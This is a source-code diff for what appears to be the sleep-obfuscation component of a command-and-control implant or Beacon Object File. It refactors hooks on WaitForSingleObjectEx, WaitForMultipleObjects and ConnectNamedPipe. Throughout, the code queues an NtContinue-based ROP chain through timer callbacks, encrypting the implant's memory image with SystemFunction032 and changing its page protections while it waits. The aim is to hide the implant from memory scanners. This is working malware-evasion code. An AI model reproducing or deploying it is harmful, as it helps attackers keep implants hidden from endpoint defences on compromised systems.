@@ -94,25 +94,53 @@ ULONG RndThreadId(ULONG CurrentThreadId) {
     return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
 }
 
-VOID HandleUnexpectedError(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs, FLUSH_FILE_BUFFERS_ARGS *FFBArgs, WAIT_FOR_SINGLE_OBJECT_EX_ARGS *WFSOExArgs) {
+
+VOID HandleUnexpectedError(HOOK_TYPE Hook, HOOK_ARGS *Args) {
     switch(Hook) {
-        case SLEEP:
-            KERNEL32$WaitForSingleObject(NtCurrentProcess(), Args->dwMilliseconds);
+        case WAIT_FOR_SINGLE_OBJECT_EX:
+            Args->WaitForSingleObjectExArgs.OriginalFunc(Args->WaitForSingleObjectExArgs.hObject, Args->WaitForSingleObjectExArgs.dwMilliseconds, Args->WaitForSingleObjectExArgs.bAlertable);
+            break;
+        case WAIT_FOR_MULTIPLE_OBJECTS:
+            Args->WaitForMultipleObjectsArgs.OriginalFunc(Args->WaitForMultipleObjectsArgs.nCount, Args->WaitForMultipleObjectsArgs.lpHandles, Args->WaitForMultipleObjectsArgs.bWaitAll, Args->WaitForMultipleObjectsArgs.dwMilliseconds);
             break;
         case CONNECT_NAMED_PIPE:
-            CnPArgs->OriginalFunc(CnPArgs->hNamedPipe, NULL);
-            break;
-        case FLUSH_FILE_BUFFERS:
-            FFBArgs->OriginalFunc(FFBArgs->hFile);
-            break;
-        case WAIT_FOR_SINGLE_OBJECT_EX:
-            WFSOExArgs->OriginalFunc(WFSOExArgs->hObject, WFSOExArgs->dwMilliseconds, WFSOExArgs->bAlertable);
+            Args->ConnectNamedPipeArgs.OriginalFunc(Args->ConnectNamedPipeArgs.hPipe, Args->ConnectNamedPipeArgs.lpOverlapped);
             break;
     }
 }
 
+VOID DetourWaitForMultipleObjects(WAIT_FOR_MULTIPLE_OBJECTS_ARGS *Args) {
+    DWORD returnValue = Args->OriginalFunc(Args->nCount, Args->lpHandles, Args->bWaitAll, Args->dwMilliseconds);
+    Args->returnValue = returnValue; // Store the return value for use in the ROP chain
+}
 
-VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs, FLUSH_FILE_BUFFERS_ARGS *FFBArgs, WAIT_FOR_SINGLE_OBJECT_EX_ARGS *WFSOExArgs)
+/**
+ * Resolve all original function pointers once so hooked functions and
+ * EkkoObf do not call GetProcAddress on every invocation.
+ * Called from set_image_info() after the DLL image is mapped.
+ */
+VOID ResolveHookFunctions(VOID)
+{
+
+    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
+    HMODULE hNtdll    = KERNEL32$GetModuleHandleA("ntdll.dll");
+    HMODULE hAdvapi   = KERNEL32$LoadLibraryA("advapi32.dll");
+
+    g_pWaitForSingleObjectEx  = (fnWaitForSingleObjectEx) KERNEL32$GetProcAddress(hKernel32, "WaitForSingleObjectEx");
+    g_pWaitForMultipleObjects = (fnWaitForMultipleObjects)KERNEL32$GetProcAddress(hKernel32, "WaitForMultipleObjects");
+    g_pConnectNamedPipe       = (fnConnectNamedPipe)     KERNEL32$GetProcAddress(hKernel32, "ConnectNamedPipe");
+    g_pNtContinue             = (fnNtContinue)            KERNEL32$GetProcAddress(hNtdll,    "NtContinue");
+    g_pRtlCaptureContext      = (fnRtlCaptureContext)     KERNEL32$GetProcAddress(hNtdll,    "RtlCaptureContext");
+    g_pSysFunc032             = (fnSystemFunction032)     KERNEL32$GetProcAddress(hAdvapi,   "SystemFunction032");
+
+    StealthDbg("ResolveHookFunctions: WaitSingleObjEx=%p WaitMultiObjs=%p ConnectNamedPipe=%p\n",
+        g_pWaitForSingleObjectEx, g_pWaitForMultipleObjects, g_pConnectNamedPipe);
+    StealthDbg("ResolveHookFunctions: NtContinue=%p RtlCaptureCtx=%p SysFunc032=%p\n",
+        g_pNtContinue, g_pRtlCaptureContext, g_pSysFunc032);
+
+}
+
+VOID EkkoObf(HOOK_TYPE Hook, HOOK_ARGS *Args)
 {
     ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
     ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);
@@ -172,22 +200,13 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
 
     if (!g_ImageBase || !g_ImageSize) {
         StealthDbg("ERROR: ImageBase or ImageSize not set, cannot proceed with obfuscation\n");
-        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
+        HandleUnexpectedError(Hook, Args);
         return;
     }
 
-    /* ── resolve NtContinue, RtlCaptureContext, SystemFunction032 ── */
-    HMODULE hNtdll  = KERNEL32$GetModuleHandleA("ntdll");
-    HMODULE hAdvapi = KERNEL32$LoadLibraryA("Advapi32");
-
-
-    fnNtContinue        pNtContinue       = (fnNtContinue)       KERNEL32$GetProcAddress(hNtdll,  "NtContinue");
-    fnRtlCaptureContext pRtlCaptureContext = (fnRtlCaptureContext)KERNEL32$GetProcAddress(hNtdll,  "RtlCaptureContext");
-    fnSystemFunction032 pSysFunc032        = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");
-
-    if (!pNtContinue || !pRtlCaptureContext || !pSysFunc032) {
-        StealthDbg("ERROR: failed to resolve required functions, cannot proceed with obfuscation\n");
-        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
+    if (!g_pNtContinue || !g_pRtlCaptureContext || !g_pSysFunc032) {
+        StealthDbg("ERROR: required functions not resolved, cannot proceed with obfuscation\n");
+        HandleUnexpectedError(Hook, Args);
         return;
     }
 
@@ -221,7 +240,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
 
     if (!MainThreadHandle) {
         StealthDbg("ERROR: DuplicateHandle for main thread failed, cannot proceed with obfuscation\n");
-        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
+        HandleUnexpectedError(Hook, Args);
         return;
     }
 
@@ -243,7 +262,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
         if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
 
         StealthDbg("falling back to original function\n");
-        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
+        HandleUnexpectedError(Hook, Args);
         return;
     }
     StealthDbg("events and timer queue created\n");
@@ -263,7 +282,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     KERNEL32$CreateTimerQueueTimer(
         &hNewTimer,
         hTimerQueue,
-        (WAITORTIMERCALLBACK)pRtlCaptureContext,
+        (WAITORTIMERCALLBACK)g_pRtlCaptureContext,
         &CtxThread,
         DelayTimer += 100,
         0,
@@ -331,45 +350,38 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     RopProtRW.R9  = (DWORD64)&OldProtect;
 
     /* ── ROP 4: SystemFunction032 → encrypt ── */
-    RopMemEnc.Rip = (DWORD64)pSysFunc032;
+    RopMemEnc.Rip = (DWORD64)g_pSysFunc032;
     RopMemEnc.Rcx = (DWORD64)&Img;
     RopMemEnc.Rdx = (DWORD64)&Key;
 
     switch (Hook) {
-        case SLEEP:
-            StealthDbg("sleep obfuscation: Sleep(%lu ms)\n", Args->dwMilliseconds);
-                /* ── ROP 5: WaitForSingleObject → sleep ── */
-            RopDelay.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
-            RopDelay.Rcx = (DWORD64)NtCurrentProcess();
-            RopDelay.Rdx = (DWORD64)Args->dwMilliseconds;
-            break;
-        case CONNECT_NAMED_PIPE:
-            StealthDbg("sleep obfuscation: ConnectNamedPipe(%p, %p)\n", CnPArgs->hNamedPipe, CnPArgs->lpOverlapped);
-                /* ── ROP 5: ConnectNamedPipe ── */
-            RopDelay.Rip = (DWORD64)CnPArgs->OriginalFunc;
-            RopDelay.Rcx = (DWORD64)CnPArgs->hNamedPipe;
-            RopDelay.Rdx = (DWORD64)CnPArgs->lpOverlapped;
-            break;
         case WAIT_FOR_SINGLE_OBJECT_EX:
              /* ── ROP 5: WaitForSingleObjectEx ── */
-            RopDelay.Rip = (DWORD64)WFSOExArgs->OriginalFunc;
-            RopDelay.Rcx = (DWORD64)WFSOExArgs->hObject;
-            RopDelay.Rdx = (DWORD64)WFSOExArgs->dwMilliseconds;
-            RopDelay.R8  = (DWORD64)WFSOExArgs->bAlertable;
+            RopDelay.Rip = (DWORD64)Args->WaitForSingleObjectExArgs.OriginalFunc;
+            RopDelay.Rcx = (DWORD64)Args->WaitForSingleObjectExArgs.hObject;
+            RopDelay.Rdx = (DWORD64)Args->WaitForSingleObjectExArgs.dwMilliseconds;
+            RopDelay.R8  = (DWORD64)Args->WaitForSingleObjectExArgs.bAlertable;
+            break;
+        
+        case WAIT_FOR_MULTIPLE_OBJECTS:
+             /* ── ROP 5: WaitForMultipleObjects ── */
+            RopDelay.Rip = (DWORD64)DetourWaitForMultipleObjects;
+            RopDelay.Rcx = (DWORD64)&Args->WaitForMultipleObjectsArgs;
             break;
 
-        case FLUSH_FILE_BUFFERS:
-            StealthDbg("sleep obfuscation: FlushFileBuffers(%p)\n", FFBArgs->hFile);
-             /* ── ROP 5: FlushFileBuffers ── */
-            RopDelay.Rip = (DWORD64)FFBArgs->OriginalFunc;
-            RopDelay.Rcx = (DWORD64)FFBArgs->hFile;
+        case CONNECT_NAMED_PIPE:
+             /* ── ROP 5: ConnectNamedPipe ── */
+            RopDelay.Rip = (DWORD64)g_pConnectNamedPipe;
+            RopDelay.Rcx = (DWORD64)Args->ConnectNamedPipeArgs.hPipe;
+            RopDelay.Rdx = (DWORD64)Args->ConnectNamedPipeArgs.lpOverlapped;
             break;
+
         default:
             StealthDbg("sleep obfuscation: unknown hook type %d\n", Hook);
     }
 
     /* ── ROP 6: SystemFunction032 → decrypt ── */
-    RopMemDec.Rip = (DWORD64)pSysFunc032;
+    RopMemDec.Rip = (DWORD64)g_pSysFunc032;
     RopMemDec.Rcx = (DWORD64)&Img;
     RopMemDec.Rdx = (DWORD64)&Key;
 
@@ -388,16 +400,16 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     StealthDbg("queuing ROP chain (10 steps)...\n");
 
     /* queue each context frame via NtContinue, staggered 100ms apart */
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopGetCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetSpf, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay,  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRX, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
-    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopGetCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopSetSpf, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopProtRW, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopMemEnc, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopDelay,  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopMemDec, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopProtRX, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
+    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
 
     StealthDbg("all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);
 
@@ -418,63 +430,76 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     StealthDbg("cleanup done\n");
 }
 
-
-VOID _Sleep(DWORD dwMilliseconds) {
-    SLEEP_ARGS Args = { dwMilliseconds };
-    if ( dwMilliseconds <= 1000 ) {
-        StealthDbg("Sleep(%lu ms) - below threshold, skipping obfuscation\n", dwMilliseconds);
-        KERNEL32$WaitForSingleObject(NtCurrentProcess(), dwMilliseconds);
-        return;
-    }
-    StealthDbg("Sleep(%lu ms) -> Ekko sleep obfuscation\n", dwMilliseconds);
-    EkkoObf(SLEEP, &Args, NULL, NULL, NULL);
-
-}
-
-BOOL _ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
-    StealthDbg("ConnectNamedPipe called - simulating success\n");
-    fnConnectNamedPipe original_ConnectNamedPipe = (fnConnectNamedPipe)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ConnectNamedPipe");
-
-    if (original_ConnectNamedPipe) {
-        CONNECT_NAMED_PIPE_ARGS CnPArgs = { hNamedPipe, lpOverlapped, original_ConnectNamedPipe };
-        EkkoObf(CONNECT_NAMED_PIPE, NULL, &CnPArgs, NULL, NULL);
-        return TRUE; // Simulate success without actually calling the original function
-    } else {
-        StealthDbg("ERROR: original ConnectNamedPipe not found\n");
-        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
-        return FALSE;
-    }
-
-}
-
-BOOL _FlushFileBuffers(HANDLE hFile) {
-    StealthDbg("FlushFileBuffers called - simulating success\n");
-    fnFlushFileBuffers original_FlushFileBuffers = (fnFlushFileBuffers)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FlushFileBuffers");
-
-    if (original_FlushFileBuffers) {
-        FLUSH_FILE_BUFFERS_ARGS FFBArgs = { hFile, original_FlushFileBuffers };
-        EkkoObf(FLUSH_FILE_BUFFERS, NULL, NULL, &FFBArgs, NULL);
-        return TRUE; // Simulate success without actually calling the original function
-    } else {
-        StealthDbg("ERROR: original FlushFileBuffers not found\n");
-        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
-        return FALSE;
-    }
-}
-
 DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable) {
     StealthDbg("WaitForSingleObjectEx called - simulating wait\n");
-    // For simplicity, we'll just call the original WaitForSingleObjectEx without obfuscation
-    fnWaitForSingleObjectEx original_WaitForSingleObjectEx = (fnWaitForSingleObjectEx)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "WaitForSingleObjectEx");
-
-    if (original_WaitForSingleObjectEx) {
-        // return original_WaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable);
-        WAIT_FOR_SINGLE_OBJECT_EX_ARGS WaitArgs = { hHandle, dwMilliseconds, bAlertable, original_WaitForSingleObjectEx };
-        EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, NULL, NULL, NULL, &WaitArgs);
-        return WAIT_OBJECT_0; // Simulate that the wait completed successfully
+    
+    if (g_pWaitForSingleObjectEx) {
+        WAIT_FOR_SINGLE_OBJECT_EX_ARGS WaitArgs = { hHandle, dwMilliseconds, bAlertable, g_pWaitForSingleObjectEx };
+        if (dwMilliseconds == 1000) {
+            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
+            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
+            return g_pWaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable); 
+        }
+        else if ( dwMilliseconds < 1000 ){
+            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
+            dwMilliseconds = 100; // cap to 100ms to avoid long waits during obfuscation
+            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
+            return g_pWaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable); 
+            
+        } else {
+            StealthDbg("Wait time above threshold, applying obfuscation\n");
+            StealthDbg("  hHandle=%p dwMilliseconds=%lu bAlertable=%d\n", hHandle, dwMilliseconds, bAlertable);
+            HOOK_ARGS Args = { .WaitForSingleObjectExArgs = WaitArgs };
+            EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, &Args);
+            return WAIT_OBJECT_0; // Simulate that the wait completed successfully
+        }
     } else {
         StealthDbg("ERROR: original WaitForSingleObjectEx not found\n");
         KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
         return WAIT_FAILED;
+    }
+}
+
+DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
+    StealthDbg("WaitForSingleObject called - simulating wait\n");
+    return _WaitForSingleObjectEx(hHandle, dwMilliseconds, FALSE);    
+}
+
+
+DWORD _WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
+    StealthDbg("WaitForMultipleObjects called - simulating wait\n");
+    
+    if (g_pWaitForMultipleObjects) {
+        StealthDbg("  nCount=%lu bWaitAll=%d dwMilliseconds=%lu\n", nCount, bWaitAll, dwMilliseconds);
+        WAIT_FOR_MULTIPLE_OBJECTS_ARGS WaitArgs = { nCount, lpHandles, bWaitAll, dwMilliseconds, g_pWaitForMultipleObjects };
+        HOOK_ARGS Args = { .WaitForMultipleObjectsArgs = WaitArgs };
+        if (dwMilliseconds <= 200) {
+            StealthDbg("Sleep time below threshold, skipping obfuscation\n");
+            return g_pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds); 
+        } else {
+            StealthDbg("Wait time above threshold, applying obfuscation\n");
+            EkkoObf(WAIT_FOR_MULTIPLE_OBJECTS, &Args);
+            return Args.WaitForMultipleObjectsArgs.returnValue; // Return the value set by the ROP chain
+        }
+    } else {
+        StealthDbg("ERROR: original WaitForMultipleObjects not found\n");
+        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
+        return WAIT_FAILED;
+    }
+}
+
+BOOL _ConnectNamedPipe(HANDLE hPipe, LPOVERLAPPED lpOverlapped) {
+    StealthDbg("ConnectNamedPipe called - simulating connection\n");
+    
+    if (g_pConnectNamedPipe) {
+        StealthDbg("  hPipe=%p lpOverlapped=%p\n", hPipe, lpOverlapped);
+        CONNECT_NAMED_PIPE_ARGS ConnectArgs = { hPipe, lpOverlapped, g_pConnectNamedPipe };
+        HOOK_ARGS Args = { .ConnectNamedPipeArgs = ConnectArgs };
+        EkkoObf(CONNECT_NAMED_PIPE, &Args);
+        return TRUE; // Simulate successful connection
+    } else {
+        StealthDbg("ERROR: original ConnectNamedPipe not found\n");
+        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
+        return FALSE;
     }
 }
